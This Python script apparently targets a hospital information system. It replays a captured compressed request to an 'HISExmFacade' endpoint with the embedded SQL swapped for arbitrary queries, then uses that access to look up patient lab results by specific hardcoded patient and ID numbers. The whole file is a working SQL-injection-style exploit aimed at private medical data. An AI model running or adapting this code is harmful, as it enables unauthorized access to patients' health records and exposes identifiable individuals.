from his_client_final import HISClient
import requests
import zlib
import re

class ShortHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = ShortHunter()
hhisnum = '003617083J'
hidno = 'C221748019'

queries = [
    # 1. Get sample ID
    "SELECT PRH_PAT_ID FROM OPDUSR.PAT_RESULTH WHERE ROWNUM=1",
    # 2. Try HHISNUM short
    f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID='{hhisnum}' AND ROWNUM=1",
    # 3. Try HIDNO short
    f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID='{hidno}' AND ROWNUM=1"
]

for q in queries:
    print(f"--- Querying: {q} ---")
    res = hunter.execute_sql(q)
    if res and "<NewDataSet>" in res:
         print("!!! FOUND RESULT !!!")
         print(res[:2000])
         ids = re.findall(r'<PRH_PAT_ID>(.*?)</PRH_PAT_ID>', res)
         if ids: print(f"IDs: {ids}")
    else:
        print("[-] No data.")
